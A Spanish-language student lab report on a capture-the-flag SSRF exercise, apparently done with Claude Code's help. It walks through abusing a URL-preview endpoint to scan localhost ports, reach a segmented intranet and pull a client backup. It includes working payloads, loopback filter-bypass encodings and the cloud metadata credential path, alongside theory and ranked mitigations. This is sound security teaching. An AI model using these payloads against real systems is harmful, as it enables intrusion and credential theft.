# Informe — Laboratorio Extra · SSRF (Server-Side Request Forgery)

**Grupo:** 08 · **Integrantes:** Marco Cordoba — @MarcoCordoba · Thomas Koncurat — @Koncu1 · Lucas Leone — @LucasLeone · Geronimo Marquez — @Geromarquezz · Joaquin Moyano — @Joaco919 · **Fecha:** 08/11/2026

## 0. Declaración de uso de IA

**¿El grupo usó asistentes de IA en este trabajo?** Sí.

| Herramienta | Para qué se usó | Qué partes afectó | Cómo se verificó |
|---|---|---|---|
| Claude (Anthropic), vía Claude Code | Base teórica de SSRF y análisis del modelo de confianza por red a partir del diagrama del lab (**P1**). | Secciones 3 y 4.1. | Contrastado con la topología real (`entorno/target.compose.yml`). |
| Claude (Anthropic), vía Claude Code | Asistencia en la práctica: uso del `/preview` como oráculo para sondear `127.0.0.1` (R1), descubrimiento de la intranet (R2) y exfiltración del backup (R3); redacción de la cadena de explotación, P2–P5 y conclusión. | Secciones 1, 2, 4.2–4.5 y 5. | **Todas las salidas pegadas son ejecución real** del entorno (`docker exec cyberlab-attacker curl ...` contra los contenedores de la cátedra). Las 3 flags se validaron con `./ctf submit extra R1/R2/R3` → progreso **3/3** (captura en §2). El grupo reprodujo los comandos y comprende el mecanismo. |

El grupo declara que comprende el contenido íntegro de lo entregado y que puede explicar y defender oralmente cualquier parte del análisis.

---

## 1. Cadena de explotación

**Entorno:** se levantó con `docker compose -p cyberlab --project-directory . -f entorno/docker-compose.yml -f labs/labextra-ssrf/entorno/target.compose.yml up -d --build` (equivalente a `make lab N=extra`). Todos los comandos se corren desde la consola atacante (`cyberlab-attacker`), en `labnet`.

**Punto de partida — la intranet NO es alcanzable directo:**

```console
$ docker exec cyberlab-attacker curl -s --max-time 3 phantomcorp-intra/ ; echo "exit=$?"
exit=6                      # (6 = couldn't resolve host / no hay ruta desde labnet)
```

**Funcionalidad vulnerable** — el portal público expone una previsualización de URLs que el servidor fetchea:

```console
$ docker exec cyberlab-attacker curl -s phantomcorp/ | grep -A2 preview
<form action="/preview" method="get">
  <label>Previsualizar URL:&nbsp;
    <input name="url" size="48" placeholder="https://ejemplo.com"></label>
```

### R1 — Panel interno en localhost

**Descubrimiento del oráculo.** Comparé el comportamiento del `/preview` ante un
puerto abierto conocido (`:80`, el propio portal) contra uno cerrado:

```console
# Puerto ABIERTO -> devuelve el contenido fetcheado
$ docker exec cyberlab-attacker curl -s "phantomcorp/preview?url=http://127.0.0.1:80/"
<h3>Previsualizacion de http://127.0.0.1:80/</h3><hr><!doctype html>...PhantomCorp — Portal...

# Puerto CERRADO -> mensaje de error distinguible
$ docker exec cyberlab-attacker curl -s "phantomcorp/preview?url=http://127.0.0.1:9999/"
No pude traer http://127.0.0.1:9999/: <urlopen error [Errno 111] Connection refused>
```

Esa diferencia (contenido vs. `Connection refused`) convierte al `/preview` en
un **oráculo de escaneo de puertos** de `localhost` del servidor (ver P2).

**Barrido de puertos admin** sobre `127.0.0.1`:

```console
$ for p in 8080 8000 5000 3000 9090 9000 8888 8081 8443 1337 ... ; do
    r=$(docker exec cyberlab-attacker curl -s --max-time 4 "phantomcorp/preview?url=http://127.0.0.1:$p/")
    echo "$r" | grep -q "Connection refused" && echo "$p cerrado" || echo "$p ABIERTO <<<"
  done
8080 cerrado
...
9000 ABIERTO <<<
...
```

**Lectura del panel interno (puerto 9000):**

```console
$ docker exec cyberlab-attacker curl -s "phantomcorp/preview?url=http://127.0.0.1:9000/"
<h2>PhantomCorp — Panel interno (solo localhost)</h2>
<p>Si estás viendo esto desde afuera, algo salió mal.</p>
<p>Deploy key: <b>FLAG{ssrf_localhost_panel_interno}</b></p>
```

> **Flag R1:** `FLAG{ssrf_localhost_panel_interno}` — validada con `./ctf submit extra R1`.

### R2 — Intranet en la red interna

El hostname interno se deduce del patrón de nombres de PhantomCorp que ya
conocemos de otros labs (`phantomcorp` → `phantomcorp-intra`). El servidor, que
sí está en `internalnet`, la fetchea por nosotros:

```console
$ docker exec cyberlab-attacker curl -s "phantomcorp/preview?url=http://phantomcorp-intra/"
<h1>Intranet PhantomCorp</h1>
<p><b>USO INTERNO.</b> Si la estás viendo desde afuera, avisá a Seguridad.</p>
<p>Host: <b>FLAG{ssrf_intranet_descubierta}</b></p>
<ul>
  <li><a href="/backups/clientes.json">backup de clientes (temporal, borrar!)</a></li>
  <li><a href="/salud">estado del servicio</a></li>
</ul>
```

El propio index de la intranet **filtra el camino al backup** (R3).

> **Flag R2:** `FLAG{ssrf_intranet_descubierta}` — validada con `./ctf submit extra R2`.

### R3 — Exfiltración del backup

Siguiendo el enlace `/backups/clientes.json` que expuso la intranet:

```console
$ docker exec cyberlab-attacker curl -s "phantomcorp/preview?url=http://phantomcorp-intra/backups/clientes.json"
{
  "_aviso": "backup temporal pre-migracion. NO deberia ser accesible.",
  "clientes": [
    {"id": 1, "empresa": "Aconcagua SRL", "cuit": "30-70998877-1"},
    {"id": 2, "empresa": "Comechingones SA", "cuit": "30-71554433-6"}
  ],
  "integridad": "FLAG{ssrf_backup_clientes}"
}
```

**Datos sensibles exfiltrados:** razón social y **CUIT** de dos clientes
(Aconcagua SRL, Comechingones SA) — datos personales/comerciales que jamás
deberían cruzar el perímetro.

> **Flag R3:** `FLAG{ssrf_backup_clientes}` — validada con `./ctf submit extra R3`.

## 2. Evidencia de progreso

```
  ╭────────────────────────────────────────────────────────────╮
  │                   PROGRESO · LAB extra                    │
  ╰────────────────────────────────────────────────────────────╯

   ✓  R1     El server fetchea por vos: panel interno en localhost
   ✓  R2     Descubrir la intranet en la red interna
   ✓  R3     Exfiltrar datos sensibles a traves del SSRF

  ██████████████████████████████  3/3 (100%)

[ OK ] ¡Lab extra COMPLETO!
```

---

## 3. Parte 1 (teoría) — el servidor como cómplice involuntario

### 3.1 Qué es un SSRF

Un **Server-Side Request Forgery** ocurre cuando una aplicación recibe una URL
bajo control del atacante y **la fetchea desde el servidor**. La clave es *quién*
hace el pedido: sale **desde el servidor**, con su identidad y su **posición de
red**. El atacante no toca la red interna — la toca el servidor por él:

```
   vos ──> web: "fetcheame http://intranet/backups"
              │
              └── el server (que SÍ está en la red interna) la fetchea
                  y te devuelve el contenido
```

SSRF desnuda el supuesto central de la arquitectura moderna: la **confianza por
ubicación de red** (*"si viene de adentro, es de confianza"*). Es **A10:2021**
en el OWASP Top 10.

### 3.2 Los tres destinos clásicos

| Destino | Qué hay | Por qué importa |
|---|---|---|
| `http://127.0.0.1:PUERTO` | Servicios que escuchan **solo en localhost** (admin, métricas, debug) | "Solo localhost" deja de ser defensa: para el SSRF, el servidor *es* localhost. Es el **R1**. |
| `http://host-interno` | Intranets, APIs internas, bases de administración | La segmentación se anula si un host de la DMZ fetchea arbitrario. Es el **R2/R3**. |
| `http://169.254.169.254` | Metadata service de la nube | Credenciales temporales → compromiso de toda la cuenta cloud. Ver P5. |

### 3.3 Cómo se detecta un SSRF candidato

Cualquier funcionalidad que **reciba una URL/host y la contacte** por el usuario:
"previsualizar link", "importar desde URL", "avatar por URL", webhooks, "probar
conexión", generadores de PDF/thumbnails. En este lab, el candidato es el
`/preview` del portal, que fetchea sin validación ni allowlist.

### 3.4 La idea central

> **El perímetro ya no es el límite.** Si el servidor puede pedir, el atacante
> puede pedir a través del servidor.

---

## 4. Preguntas de análisis

### 4.1 P1 — ¿Por qué dejó de ser cierto que "la intranet no es alcanzable desde afuera"?

Topología real (`target.compose.yml`):

- `phantomcorp` (web) está en **dos** redes: `labnet` **e** `internalnet`.
- `phantomcorp-intra` está **solo** en `internalnet` (`internal: true`, sin ruta externa).
- La consola atacante está **solo** en `labnet`.

```
   atacante ──labnet──>  phantomcorp (web :80)  ──internalnet──>  phantomcorp-intra
        │                        │                                        ▲
        └─────────── ✗ NO hay ruta directa ──────────────────────────────┘
```

A nivel de red, la afirmación es **verdadera**: no hay ruta IP de `labnet` a la
intranet. Lo probamos: el `curl` directo da `exit=6`.

**Lo que la hace alcanzable es el servidor `phantomcorp`**, que está *dual-homed*
(un pie en cada red) y cuyo `/preview` fetchea URLs arbitrarias **desde su propia
posición de red**, es decir desde dentro de `internalnet`. El atacante nunca
envía un paquete a la intranet; le pide al servidor que lo haga. El componente
que rompe la segmentación no es la red: es la **funcionalidad de la aplicación**
(`/preview` sin allowlist) sobre un host con visibilidad interna. La segmentación
seguía intacta; lo que falló fue confiar en que nadie con acceso a ambos lados
haría de proxy.

### 4.2 P2 — El oráculo de escaneo de puertos

En R1, el `/preview` respondió de dos formas distinguibles según el estado del
puerto de `127.0.0.1`:

| Estado del puerto | Respuesta del `/preview` |
|---|---|
| **Abierto** (ej. 80, 9000) | Devuelve el **contenido** fetcheado (`<h3>Previsualizacion de ...`) |
| **Cerrado** (ej. 9999) | `No pude traer ...: <urlopen error [Errno 111] Connection refused>` |

Esa diferencia es exactamente un **oráculo**: una señal observable que revela un
estado interno que no deberíamos poder ver. `Errno 111 (Connection refused)`
significa que el kernel del servidor recibió un RST → **no hay servicio** en ese
puerto. La ausencia de ese error → **hay un servicio escuchando**. Repitiendo la
consulta sobre un rango de puertos, el atacante reconstruye el mapa de servicios
que corren en `localhost` del servidor **sin tener ninguna shell ni acceso** a esa
máquina — convierte al `/preview` en un `nmap` por delegación. (Un tercer estado,
filtrado por firewall, se vería como **timeout** en lugar de refused inmediato:
el tiempo de respuesta también es un canal del oráculo.)

### 4.3 P3 — Hallazgo profesional

> **Título:** Exfiltración de datos de clientes vía SSRF en la previsualización de URLs del portal público.
>
> **Activo afectado:** Backup `clientes.json` alojado en la intranet
> `phantomcorp-intra` (red interna `internalnet`, sin exposición directa). Contiene
> razón social y **CUIT** de clientes de PhantomCorp.
>
> **Vector:** La función `/preview?url=` del portal público (`phantomcorp`, DMZ)
> acepta una URL arbitraria y la fetchea desde el servidor, sin allowlist ni
> validación de destino. El servidor está *dual-homed* (DMZ + red interna), por lo
> que el atacante lo usa como proxy hacia `internalnet`, inalcanzable de otro modo.
>
> **Impacto:** Confidencialidad — acceso no autorizado a datos personales/comerciales
> de clientes (CUIT). Un atacante externo, sin credenciales ni shell, cruza el
> perímetro y lee un backup marcado como "NO debería ser accesible". Riesgo legal
> (Ley 25.326 de Protección de Datos Personales) y reputacional.
>
> **Evidencia:**
> ```
> GET phantomcorp/preview?url=http://phantomcorp-intra/backups/clientes.json
> → {"clientes":[{"empresa":"Aconcagua SRL","cuit":"30-70998877-1"}, ...],
>    "integridad":"FLAG{ssrf_backup_clientes}"}
> ```
> El mismo vector permitió leer un panel admin interno (`127.0.0.1:9000`) teóricamente
> restringido a localhost.

### 4.4 P4 — Tres mitigaciones (mejor a peor)

1. **Allowlist estricta de destinos + fetch sobre la IP resuelta (la mejor).**
   El `/preview` solo debería contactar un conjunto cerrado de dominios externos
   aprobados. Se resuelve el DNS **una vez**, se valida que la IP resultante **no**
   sea privada/loopback/link-local (`127/8`, `10/8`, `172.16/12`, `192.168/16`,
   `169.254/16`, `::1`) y se fetchea **esa misma IP** (no el hostname). *Limitación:*
   mantener la allowlist tiene costo operativo, y si un dominio permitido es tomado
   por un atacante (o hace redirect a un destino interno) hay que validar también
   cada redirect con la misma regla.

2. **Bloqueo de rangos internos por IP resuelta, sin allowlist (intermedia).**
   Igual que arriba pero permitiendo cualquier dominio público, rechazando solo las
   IPs internas. *Limitación:* vulnerable a **DNS rebinding** — un dominio que en la
   primera resolución devuelve una IP pública (pasa el chequeo) y en la segunda, al
   fetchear, devuelve `127.0.0.1`. Se mitiga resolviendo y fetcheando contra la
   **misma** IP ya validada (DNS pinning), nunca re-resolviendo.

3. **Filtrado de strings tipo "localhost"/"127.0.0.1" (la peor, casi inútil).**
   Un simple blocklist de substrings se evade trivialmente. **Lo comprobamos en
   este lab:** el panel interno responde igual con `http://2130706433:9000/`
   (127.0.0.1 en **decimal**) y con `http://127.1:9000/` (forma corta) — ambos
   devolvieron `FLAG{ssrf_localhost_panel_interno}`. A eso se suman IPv6 (`[::1]`,
   `[::ffff:127.0.0.1]`), `0.0.0.0`, octal (`0177.0.0.1`), un dominio propio que
   resuelve a 127.0.0.1, y redirects. Filtrar la *representación textual* del
   destino nunca alcanza: hay que validar la **IP resuelta**, no el string.

### 4.5 P5 — Conexión con la nube (metadata service)

En AWS/GCP/Azure, toda instancia puede consultar un **metadata service** en la IP
*link-local* `169.254.169.254` (en GCP, `metadata.google.internal`). Expone
configuración de la instancia y, lo crítico, en AWS bajo
`/latest/meta-data/iam/security-credentials/<rol>` entrega **credenciales
temporales** del rol IAM de la instancia (AccessKey + Secret + Token). Esa IP solo
es alcanzable *desde la propia instancia*, así que se asume "confiable".

Un SSRF en una app cloud rompe ese supuesto: el atacante le pide al servidor que
fetchee `http://169.254.169.254/latest/meta-data/iam/security-credentials/...` y
recibe credenciales válidas de la nube. Con ellas pivota a S3, bases de datos,
etc. — **es exactamente lo que pasó en Capital One (2019): 100M de registros**. Es
el R1 de este lab elevado a la enésima potencia: acá leer `127.0.0.1:9000` dio un
panel; en cloud, el "localhost" equivalente (`169.254.169.254`) entrega las llaves
de toda la cuenta. **IMDSv2** mitiga esto exigiendo un token obtenido con un `PUT`
previo y cabecera propia: como la mayoría de los SSRF solo hacen `GET` de una URL,
no pueden completar el handshake y el robo de credenciales se bloquea.

---

## 5. Conclusión (resumen ejecutivo para el CTO de PhantomCorp)

La intranet que dieron por "inaccesible desde afuera" fue leída por completo —
panel de administración interno y backup de datos de clientes con CUIT — **sin
vulnerar la red, sin credenciales y sin ninguna shell**. Bastó una función del
portal público (la previsualización de URLs) que fetchea cualquier dirección que
le pasen. Como el servidor web tiene un pie en la red interna, se convirtió en
nuestro proxy: cada pedido salió con su identidad y su posición de red. La lección
es que **la segmentación de red no protege si una aplicación expuesta hace pedidos
arbitrarios por el usuario**: la confianza "viene de adentro, es seguro" es una
defensa ilusoria. Recomendamos, en orden: allowlist de destinos validando la IP
ya resuelta (con DNS pinning), bloqueo de rangos internos, y jamás confiar en
filtros de texto sobre la URL. El arreglo es acotado (una sola función) y urgente:
hoy expone datos personales de clientes, con el riesgo legal que eso implica.
